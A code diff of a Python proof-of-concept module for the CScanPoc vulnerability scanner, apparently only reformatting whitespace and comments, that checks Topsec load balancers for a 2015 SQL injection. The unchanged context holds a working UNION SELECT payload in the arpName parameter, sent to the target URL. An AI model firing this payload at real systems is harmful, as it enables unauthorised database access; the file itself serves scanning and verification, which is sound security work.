@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'TOPSEC_0005'  # 平台漏洞编号，留空
     name = '天融信负载均衡系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-05'  # 漏洞公布时间
     desc = '''
         天融信负载均衡系统 /acc/bindipmac/static_arp_setting_content.php 信息泄SQL注入露洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '天融信负载均衡系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e0ab77b7-c0fa-4304-b44a-3b3214848b81'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref http://www.wooyun.org/bugs/wooyun-2015-0118363
+            # ref http://www.wooyun.org/bugs/wooyun-2015-0118363
             payload = '/acc/bindipmac/static_arp_setting_content.php?arpName=123%27%20UNION%20ALL%20SELECT%20NULL,strftime(%27%s%27,%272015-11-11%27),NULL,NULL,NULL,NULL,NULL,NULL--'
             verify_url = self.target + payload
             req = requests.get(verify_url)
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
